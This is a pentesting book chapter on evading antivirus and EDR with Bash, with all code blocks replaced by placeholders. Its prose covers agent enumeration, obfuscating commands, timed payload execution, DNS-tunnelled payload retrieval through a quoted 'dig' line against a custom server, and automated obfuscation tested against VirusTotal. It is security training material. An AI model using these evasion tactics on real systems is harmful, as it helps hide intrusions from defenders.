@@ -1,0 +1,991 @@
+- en: '14'
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: Evasion and Obfuscation
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: In cybersecurity, mastering **evasion** and **obfuscation** techniques is critical
+    for both offense and defense. With the rise of **antivirus** ( **AV** ) and **Endpoint
+    Detection and Response** ( **EDR** ) systems, pentesters must now learn evasion
+    skills traditionally used by red teams. Without these skills, your efforts to
+    identify vulnerabilities and create exploit proofs of concept could be blocked,
+    possibly leading to false negatives regarding system vulnerabilities.
+  prefs: []
+  type: TYPE_NORMAL
+- en: This chapter focuses on using the Bash shell to implement these techniques,
+    specifically in the context of evading detection by AV and EDR systems during
+    pentesting activities. AV and EDR were formerly only found in Windows environments.
+    Today, they are frequently deployed to Linux/Unix systems.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Throughout this chapter, we will explore various methods of creating and executing
+    Bash scripts that minimize the risk of detection. We’ll begin by examining how
+    to enumerate the environment for AV and EDR presence, then progress through basic
+    and advanced obfuscation techniques. Finally, we’ll look at automating the generation
+    of evasion scripts.
+  prefs: []
+  type: TYPE_NORMAL
+- en: By the end of this chapter, you will have a solid understanding of how AV and
+    EDR systems function, common detection mechanisms, and practical skills in employing
+    obfuscation and evasion tactics using Bash. These skills are valuable not only
+    for pentesters but also for security professionals seeking to enhance their defensive
+    capabilities by understanding the techniques used by potential attackers.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'In this chapter, we’re going to cover the following main topi cs:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Enumerating the environment for AV and EDR
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Basic obfuscation techniques in Bash
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Advanced evasion tactics using Bash
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Automating evasion script generation in Bash
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Technical requirements
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: 'To complete this chapter, we need access to a Linux environment with a Bash
+    shell to execute the examples. Additionally, prerequisite Bash utilities can be
+    installed by executing the following command:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE0]'
+  prefs: []
+  type: TYPE_PRE
+- en: The code for this chapter can be found at [https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter14](https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter14)
+    .
+  prefs: []
+  type: TYPE_NORMAL
+- en: With the prerequisites out of the way, let’s dive in!
+  prefs: []
+  type: TYPE_NORMAL
+- en: Enumerating the environment for AV and EDR
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: Before attempting any evasion techniques, it’s essential to understand the security
+    landscape of the target system. This section focuses on identifying and analyzing
+    the presence of AV and EDR solutions using Bash scripting. We’ll explore practical
+    methods of gathering information about installed security software, active monitoring
+    processes, and system configurations that may impact our pentesting activities.
+    By using Bash commands and scripts, we’ll develop a systematic approach to reconnaissance.
+    This will enable more effective and targeted evasion strategies in subsequent
+    phases of our assessment.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Environment reconnaissance is a critical first step in any pentest engagement,
+    especially when dealing with systems protected by AV and EDR solutions. This process
+    involves gathering detailed information about the target system’s security measures,
+    which is essential for several reasons:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**Tailored approach** : By understanding the specific AV/EDR solutions in place,
+    you can customize your pentest techniques to avoid detection. Each security solution
+    has its own strengths and weaknesses, and knowing these allows you to adapt your
+    methods accordingly.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Risk mitigation** : Reconnaissance helps identify potential risks associated
+    with your testing activities. For example, some EDR solutions might trigger alerts
+    or even automatic responses to certain actions. Understanding these risks allows
+    you to plan your testing more carefully and avoid unintended disruptions.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Efficiency** : Knowing the security landscape helps you focus your efforts
+    on techniques that are more likely to succeed. This saves time and resources by
+    avoiding methods that are likely to be detected or blocked by the identified security
+    solutions.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Realistic assessment** : Understanding the target environment allows you
+    to provide a more accurate assessment of the system’s security posture. This includes
+    evaluating how well the existing security solutions are configured and identifying
+    any gaps in protection.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Stealth** : In scenarios where maintaining a low profile is critical, environment
+    reconnaissance allows you to design your tests to minimize the risk of detection.
+    This is particularly important in red team exercises or when testing production
+    systems.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Let’s first take a look at process enumeration:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: One of the primary methods is examining running processes. This can be done
+    using commands such as **ps** , **top** , or **htop** .
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'The following shows how to list all running processes:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '[PRE1]'
+  prefs:
+  - PREF_IND
+  type: TYPE_PRE
+- en: 'This command looks for specific AV/EDR process names:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '[PRE2]'
+  prefs:
+  - PREF_IND
+  type: TYPE_PRE
+- en: The output will have many false positives due to the short **av** and **edr**
+    strings since they may match other unrelated words. Review the output carefully.
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: Filesystem analysis is another important aspect of endpoint protection software
+    enumeration, that is, checking for the presence of specific files or directories
+    associated with AV/EDR solutions.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'We can search for common AV/EDR-related directories, as follows:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '[PRE3]'
+  prefs:
+  - PREF_IND
+  type: TYPE_PRE
+- en: 'The following command finds files with specific names:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '[PRE4]'
+  prefs:
+  - PREF_IND
+  type: TYPE_PRE
+- en: You should also be examining network connections to reveal communication with
+    AV/EDR management servers.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'The following example lists all active network connections:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '[PRE5]'
+  prefs:
+  - PREF_IND
+  type: TYPE_PRE
+- en: 'In this example, we check for outbound connections to known AV/EDR servers:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '[PRE6]'
+  prefs:
+  - PREF_IND
+  type: TYPE_PRE
+- en: And, of course, we can’t forget service enumeration. Many AV/EDR solutions run
+    as services.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'The following example lists all services:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '[PRE7]'
+  prefs:
+  - PREF_IND
+  type: TYPE_PRE
+- en: 'After listing services, we can check the status of specific services as follows:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '[PRE8]'
+  prefs:
+  - PREF_IND
+  type: TYPE_PRE
+- en: 'Some AV/EDR solutions use kernel modules. The following command will help you
+    to reveal kernel modules potentially used for endpoint protection:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '[PRE9]'
+  prefs:
+  - PREF_IND
+  type: TYPE_PRE
+- en: 'We can refine the previous command to check for specific modules:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '[PRE10]'
+  prefs:
+  - PREF_IND
+  type: TYPE_PRE
+- en: 'Don’t forget about system logs. Examining system logs can reveal AV/EDR activity.
+    Check the system logs for AV/EDR-related entries as follows:'
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: '[PRE11]'
+  prefs:
+  - PREF_IND
+  type: TYPE_PRE
+- en: Package manager metadata is another good source of intel. On systems using package
+    managers, you can query for installed security software.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'The following command works for Debian-based systems:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '[PRE12]'
+  prefs:
+  - PREF_IND
+  type: TYPE_PRE
+- en: 'The following command works for Red Hat-based systems:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '[PRE13]'
+  prefs:
+  - PREF_IND
+  type: TYPE_PRE
+- en: Just like privilege escalation, always check environment variables. Some AV/EDR
+    solutions set environment variables.
+  prefs:
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: 'We can list all environment variables as shown:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '[PRE14]'
+  prefs:
+  - PREF_IND
+  type: TYPE_PRE
+- en: 'We can further refine this to look for specific AV/EDR-related variables:'
+  prefs:
+  - PREF_IND
+  type: TYPE_NORMAL
+- en: '[PRE15]'
+  prefs:
+  - PREF_IND
+  type: TYPE_PRE
+- en: 'When implementing these techniques in Bash scripts, it’s important to combine
+    multiple methods for a full approach. Here’s a simple example that combines several
+    of these approaches. You can find the following code in this chapter’s GitHub
+    repository as **ch14_gather_bas ic_info.sh** :'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE16]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'AV and EDR software send data about the endpoint’s status, performance, and
+    activities. This is referred to as **telemetry** . The following script checks
+    to see whether the host is sending telemetry to common EDR domains. You can find
+    it in this chapter’s GitHub repository as **ch14_telem etry_check.sh** :'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE17]'
+  prefs: []
+  type: TYPE_PRE
+- en: These techniques should provide you with enough information to determine whether
+    a Linux or Unix system has any AV or EDR software installed. We will explore obfuscation
+    and evasion techniques in subsequent sections of this chapter.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Basic obfuscation techniques in Bash
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: In this section, we’ll explore various obfuscation techniques that can be applied
+    to Bash scripts. These methods range from simple variable name alterations to
+    more complex command substitution and encoding strategies. By combining these
+    techniques, pentesters can create scripts that are more likely to evade detection
+    and resist analysis.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Obfuscation in Bash scripting is the practice of making code difficult to understand
+    while preserving its functionality. For pentesters, obfuscation serves as a valuable
+    technique to evade detection by security systems and complicate reverse engineering
+    efforts. This section covers fundamental obfuscation methods that can be applied
+    to Bash scripts.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Bash script obfuscation involves modifying the script’s appearance and structure
+    without altering its behavior. The goal is to create code that functions identically
+    to the original but is challenging for humans or automated systems to interpret.
+    While obfuscation doesn’t provide foolproof protection, it can significantly increase
+    the effort required to analyze and understand the script.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Here’s a simple example to illustrate the concept:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE18]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'This straightforward script could be obfuscated as follows:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE19]'
+  prefs: []
+  type: TYPE_PRE
+- en: The **printf** command uses command substitution with the hexadecimal representation
+    of the text **Hello World** .
+  prefs: []
+  type: TYPE_NORMAL
+- en: Both scripts produce the same output, but the second one is considerably more
+    difficult to read at a glance.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The next example uses basic variable substitution to run the **sudo -l** command,
+    which is detected by the EDR agent:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE20]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'We can do more advanced command substitution with **prin tf** , as shown here:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE21]'
+  prefs: []
+  type: TYPE_PRE
+- en: This results in running the same command, as shown in the following figure.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 14.1 – The output of running an obfuscated sudo command is shown](image/B22229_14_01.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 14.1 – The output of running an obfuscated sudo command is shown
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Base64 encoding can be used to obfuscate commands, as shown:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE22]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'We can also split up parts of commands using environment variables, as shown
+    in the following example:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE23]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'Brace expansion is also useful for breaking string detection, as shown here:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE24]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'The following example implements command substitution with **cut** :'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE25]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'We can also use ASCII decimal values, as shown here:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE26]'
+  prefs: []
+  type: TYPE_PRE
+- en: Each of these methods obfuscates the **sudo -l** command in a different way.
+    These techniques can be combined and nested to create more complex obfuscation.
+    However, it’s important to note that modern security solutions are often capable
+    of detecting these obfuscation attempts. These methods are more effective against
+    simple pattern matching, also known as **signature-based** **detection systems**
+    .
+  prefs: []
+  type: TYPE_NORMAL
+- en: When testing these obfuscation techniques against EDR systems, observe how each
+    method affects detection rates. Some EDR solutions might detect certain obfuscation
+    techniques while missing others. This information can be valuable for understanding
+    the capabilities and limitations of the EDR system being tested.
+  prefs: []
+  type: TYPE_NORMAL
+- en: We’ll try more advanced technique s in the next section.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Advanced evasion tactics using Bash
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: While basic obfuscation techniques can be effective, more sophisticated evasion
+    tactics are often necessary to bypass advanced security measures. This section
+    explores advanced evasion methods using Bash.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**Timing-based evasion** involves executing code based on specific time conditions,
+    making it harder for security solutions to detect malicious activity. For example,
+    I’ve bypassed AV on multiple occasions by encoding or encrypting my payloads in
+    the script or executable and inserting code to make it sleep for some time before
+    decoding or decrypting and running the payload. AV and EDR vendors do not want
+    to upset customers by taking up valuable system resources or making the system
+    appear to be slow. Therefore, sometimes simple pauses for a few minutes before
+    performing malicious activity are all you need.'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Tip
+  prefs: []
+  type: TYPE_NORMAL
+- en: AV and EDR vendors are catching on to the use of simple sleep statements. It’s
+    often necessary to use techniques more complex than a call to the **sleep()**
+    function, such as performing some random task before checking to see how much
+    time has elapsed.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The following script example avoids using sleep statements by executing benign
+    activities and checks to ensure the time is between 1 and 3 A.M. before executing
+    the payload. It can be found in this chapter’s GitHub repos itory as **ch14_sleep_1.sh**
+    :'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE27]'
+  prefs: []
+  type: TYPE_PRE
+- en: Alternatively, you can use the **sleep 600** command to sleep for 10 minutes
+    before executing the payload. Additionally, you can make detection even more difficult
+    by fetching the payload from an HTTPS URL and decoding or decrypting it after
+    the sleep statement before execution instead of storing it in the script. Most
+    AV systems would initially scan the file and not find any evidence of malicious
+    content, then not detect any malicious activity, and eventually stop monitoring
+    the file.
+  prefs: []
+  type: TYPE_NORMAL
+- en: In the case of EDR, a simple sleep statement may not be sufficient to evade
+    detection if a file, process, or network signature is detected. In cases such
+    as this, you may be able to avoid detection by spreading the activity out over
+    multiple commands or steps and inserting time between each step. Multiple actions
+    occurring in the attack chain within a specific time frame may generate a high
+    or critical severity alert. However, if you insert enough time between the actions,
+    you may evade detection, or each step may alert at a lower severity and avoid
+    scrutiny by the defenders.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The script has been modified to insert time between each step. The following
+    script can be found in this chapter’s GitHub rep ository as **ch14_sleep_2.sh**
+    :'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE28]'
+  prefs: []
+  type: TYPE_PRE
+- en: If you want to be even more stealthy, you should avoid using **curl** or **wget**
+    to fetch payloads and instead use DNS. The following example includes server-
+    and client-side code for transferring data over DNS. You would implement the client-side
+    code in your Bash script, replacing any use of **curl** or **wget** .
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The server-side code can be found in this chapter’s GitHub repository as **ch14_dns_server.py**
+    . The following client-side code can be found in this chapter’s GitHub repository
+    as **ch14_dns_client.sh** :'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE29]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'The output of the client can be found in the following figure:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 14.2 – The output of the DNS client is shown](image/B22229_14_02.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 14.2 – The output of the DNS client is shown
+  prefs: []
+  type: TYPE_NORMAL
+- en: Important note
+  prefs: []
+  type: TYPE_NORMAL
+- en: You will have to edit the server and client yourself to modify it to send payloads
+    suitable for pentesting operations. This is simply a framework. You can encode
+    or encrypt the data before transferring it, then decode or decrypt it on the client
+    side and run the code fully in memory to avoid writing to disk.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The following provides an explanation of the **retrieve_data** function code:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**local key="$1"** : This line declares a local variable, **key** , and assigns
+    it the value of the first argument passed to the function.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**echo "Sending query for: $key.get.$DOMAIN to $SERVER_IP"** : This line prints
+    a message indicating what query is being sent.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**local result=$(dig @$SERVER_IP +short TXT "$key.get.$DOMAIN")** : This is
+    the core of the function, using the **dig** command to perform a DNS query. Let’s
+    break it down:'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**dig** : This is a DNS lookup utility.'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**@$SERVER_IP** : This variable specifies the DNS server to query (your custom
+    server).'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**+short** : This tells **dig** to give a terse answer. For a **TXT** record,
+    this returns only the text data.'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**TXT** : This specifies that we’re looking for a **TXT** record.'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**"$key.get.$DOMAIN"** : This is the full domain name we’re querying, constructed
+    with the **key** variable, the word **get** , and the **DOMAIN** variable.'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: The entire command is wrapped in **$()** , which is a command substitution.
+    It runs the command and returns its output, which is then assigned to the **result**
+    variable.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**if [ -n "$result" ]; then** : This checks whether the **result** variable
+    is non-empty.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Inside the **if** block, we have the following:'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**local decoded=$(echo $result | tr -d ''"'' | base64 -d 2>/dev/null)** : This
+    line processes the result:'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**echo $result** : Outputs the result'
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**tr -d ''"''** : Removes any quote characters'
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**base64 -d** : Decodes the Base64-encoded string'
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**2>/dev/null** : Redirects any error messages to **/dev/null** ( discards
+    them)'
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**if [ $? -eq 0 ]; then** : This checks whether the previous command (the Base64
+    decoding) was successful:'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: If successful, it prints the decoded data. If not, it prints an error message
+    with the raw data.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: If **result** is empty, it prints **No data found** **for '{$key}'** .
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Finally, it prints a separator line.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: The **dig** command is very important here. It’s using DNS to transmit data,
+    querying a **TXT** record for a domain name that includes the key we’re interested
+    in. The server responds with Base64-encoded data in the **TXT** record, which
+    the client then decodes.
+  prefs: []
+  type: TYPE_NORMAL
+- en: This method of using DNS for data transfer is sometimes called **DNS tunneling**
+    or **DNS exfiltration** . It’s a creative way of transmitting data using a protocol
+    (DNS) that’s often allowed through firewalls, even when other protocols are blocked.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Having explored a variety of ways to obfuscate payloads to bypass AV or EDR
+    detection, let’s move on to the next section and explore usin g Bash to automate
+    script obfuscation.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Automating evasion script generation in Bash
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: To automate the generation of obfuscated Bash scripts, we’ll create a simple
+    framework that combines various evasion techniques. This framework will allow
+    us to quickly produce scripts that are more likely to evade detection by AV and
+    EDR systems.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Here’s a basic structure for our framework. The following code can be foun
+    d in this chapter’s GitHub repository as **ch14_auto_obfuscate_1.sh** . I’ll be
+    breaking the code down into s maller sections to provide explanations:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE30]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'The preceding code block provides a function to Base64 encode any data passed
+    to the function. In the next part of the code, a function is provided to use the
+    **openssl** program to generate random variable names compos ed of four-digit
+    hexadecimal characters:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE31]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'Then, the Bash code converts the contents of the **cmd** variable into a space-free,
+    newline -free hexadecimal string representation:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE32]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'The **od** utility is being introduced here. It’s used to output data in various
+    formats. The **od -A n -t x1** command is used to display the contents of a file
+    or input in a specific format. Here’s the breakdown:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**od** : This stands for **octal dump** and is a command-line utility used
+    for displaying data in various formats.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**-A n** : This option specifies that no address (offset) should be shown in
+    the output.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**-t x1** : This indicates the display format. **x** specifies hexadecimal
+    format, and **1** indicates 1-byte units. This means the data will be displayed
+    as two-digit hexadecimal numbers for each byte.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'The following code declares important variables and t hen reads the original
+    script line by line:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE33]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'The next code block checks whether a line of text matches a specific pattern
+    resembling a variable assignment in a script, extracts the variable name, and
+    repl aces it with an obfuscated version:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE34]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'The next Bash code block is designed to match lines that start with a command-like
+    string, obfuscate the command, and then replace it within the line with an encoded
+    represe ntation:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE35]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'The following code specifies th e original script name as a variable:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE36]'
+  prefs: []
+  type: TYPE_PRE
+- en: Then, it declares a variable for the obfuscated script based on the return value
+    from the **generate_obfuscated_script** function. The content of this variable
+    is then saved to the **obfuscated_script.sh** file.
+  prefs: []
+  type: TYPE_NORMAL
+- en: This script provides a basic framework for generating obfuscated Bash scripts.
+    It includes functions for encoding strings, obfuscating variable names, and obfuscating
+    commands. The main **generate_obfuscated_script** function reads an original script,
+    applies various obfuscation techniques, and produces an obfuscated version.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The script works by reading the original script line by line. For each line,
+    it checks whether some variable assignments or commands can be obfuscated. Variable
+    names are replaced with randomly generated names, and commands are converted into
+    hexadecimal representations that are then decoded at runtime.
+  prefs: []
+  type: TYPE_NORMAL
+- en: To make our framework more flexible and extensible, we can implement modular
+    obfuscation techniques. This approach allows us to easily add new obfuscation
+    methods or combine existing ones in different ways.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Here’s an example of how we can modify our framework to support modular obfuscation
+    techniques. This script can be found in the GitHub repository as **ch14_auto_obfuscate_2.sh**
+    :'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE37]'
+  prefs: []
+  type: TYPE_PRE
+- en: The preceding code block creates an array of obfuscation techniques and then
+    provides a function to add a technique to the array.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE38]'
+  prefs: []
+  type: TYPE_PRE
+- en: In the preceding code block, obfuscation functions are defined.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE39]'
+  prefs: []
+  type: TYPE_PRE
+- en: In the preceding code section, we choose our obfuscation techniques and add
+    them to the **obfuscation_techniques** array.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE40]'
+  prefs: []
+  type: TYPE_PRE
+- en: In the preceding code, the **apply_random_obfuscation** function randomly chooses
+    a technique, then calls the function for that technique and passes the original
+    script content into the function call.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE41]'
+  prefs: []
+  type: TYPE_PRE
+- en: In the preceding code block, the **generate_obfuscated_script** function processes
+    the original script line by line, calling the **apply_random_obfuscation** function
+    on each line. The output of each function call is appended to the **obfuscated_script**
+    variable before being printed to the terminal.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE42]'
+  prefs: []
+  type: TYPE_PRE
+- en: In the preceding code, the previously declared functions are called, which ultimately
+    ends with the obfuscated script being saved to a file.
+  prefs: []
+  type: TYPE_NORMAL
+- en: This updated framework introduces an array of obfuscation techniques and a function
+    to add new techniques. The **apply_random_obfuscation** function selects a random
+    technique to apply to each line of the script. This modular approach makes it
+    easy to add new obfuscation methods or modify existing ones without changing the
+    core logic of the script generator.
+  prefs: []
+  type: TYPE_NORMAL
+- en: To further enhance our framework, we can create a separate library of evasion
+    functions. This library will contain various obfuscation and evasion techniques
+    we’ve already covered that can be imported and used in our main script generator.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'To use this library in our main script generator, we can source it and incorporate
+    the evasion functions into our obfuscation techniques. The following line of code
+    can be used to source the Bash script containing evasion functions from an external
+    script:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE43]'
+  prefs: []
+  type: TYPE_PRE
+- en: This is demonstrated in the **ch14_auto_obfuscate_4.sh** script, whic h can
+    be found in this chapter’s GitHub repository. Because it is very similar to previous
+    versions, with the exception of sourcing the evasion functions from an external
+    script, the code will not be shown in its entirety here.
+  prefs: []
+  type: TYPE_NORMAL
+- en: This approach allows us to maintain a separate library of evasion functions,
+    making it easier to manage, update, and extend our collection of obfuscation techniques.
+  prefs: []
+  type: TYPE_NORMAL
+- en: To make our obfuscation process more dynamic and unpredictable, we can develop
+    a script that combines multiple evasion methods for each line or command in the
+    original script. This approach increases the complexity of the obfuscated script
+    and makes it more challenging for detection systems to analyze.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Here’s an example of how we can modify our script generator to dynamically
+    combine evasion methods. This is demonstrated in the following s cript, which
+    can be found in the GitHub repository as **ch14_auto_obfuscate_5.sh** :'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE44]'
+  prefs: []
+  type: TYPE_PRE
+- en: The preceding code sources the code for the obfuscation functions from an external
+    file.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE45]'
+  prefs: []
+  type: TYPE_PRE
+- en: The main difference between the **apply_multiple_obfuscations** function in
+    the preceding code and previous versions is it can use between 1 and 3 obfuscation
+    techniques instead of just 1.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE46]'
+  prefs: []
+  type: TYPE_PRE
+- en: In the preceding code, the original script code is processed line by line and
+    sent to the **apply_multiple_obfuscations** function. Once the function has processed
+    the data and applied obfuscation, it is appended to the **obfuscated_script**
+    variable.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE47]'
+  prefs: []
+  type: TYPE_PRE
+- en: This updated script introduces the **apply_multiple_obfuscations** function,
+    which applies a random number of obfuscation techniques to each line of the script.
+    This approach creates a more complex and varied obfuscation pattern, making it
+    harder to identify patterns or signatures.
+  prefs: []
+  type: TYPE_NORMAL
+- en: After generating obfuscated scripts, it’s important to test and validate them
+    against common AV and EDR products. This process helps ensure that our obfuscation
+    techniques are effective and allows us to refine our methods based on the results.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Here’s a basic script that demonstrates how we might approach testing our obfusc
+    ated scripts. It can be found in the GitHub repository as **ch14_auto_obfuscate_6.sh**
+    . You’ll need to obtain a VirusTotal API key and replace the **YOUR_API_KEY**
+    string before running the script. You can find instructions for obtaining an API
+    key at [ht tps://docs.virustotal.com/docs/please-give-me-an-api-key](https://docs.virustotal.com/docs/please-give-me-an-api-key)
+    :'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE48]'
+  prefs: []
+  type: TYPE_PRE
+- en: The **test_script** function in the preceding code block is responsible for
+    performing a scan using the ClamAV software and checking for detections on the
+    VirusTotal website.
+  prefs: []
